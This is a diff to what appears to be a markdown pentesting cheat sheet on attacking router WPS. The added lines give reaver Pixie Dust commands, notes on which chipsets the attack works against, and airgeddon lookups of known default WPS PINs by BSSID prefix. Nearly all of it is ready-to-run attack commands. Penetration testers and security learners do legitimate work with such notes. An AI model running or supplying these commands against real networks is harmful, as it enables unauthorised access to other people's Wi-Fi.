@@ -41,7 +41,18 @@ sudo reaver -i wlan0mon -b AA:BB:CC:XX:YY:ZZ -vv -K 1
 sudo reaver -i wlan0mon -b AA:BB:CC:XX:YY:ZZ -vv -p 12345678
 ```
 
-
+#### Notes
+success running this attack against Ralink and RealTek chipsets. And very spotty success against Broadcom chipsets
+```text
+sudo reaver -i {monitor interface} -b {BSSID of router} -c {router channel} -vvv -K 1 -f
+```
+#### airgeddon
+```text
+source /usr/share/airgeddon/known_pins.db
+echo ${PINDB["0013F7"]}	#first three parts of the BSSID CODE
+echo /usr/share/airgeddon/known_pins.db ${PINDB["0013F7"]} 
+grep "0013F7" /usr/share/airgeddon/known_pins.db
+```
 
 https://kalitut.com/wifi-attack-with-wps-using-reaver/
 
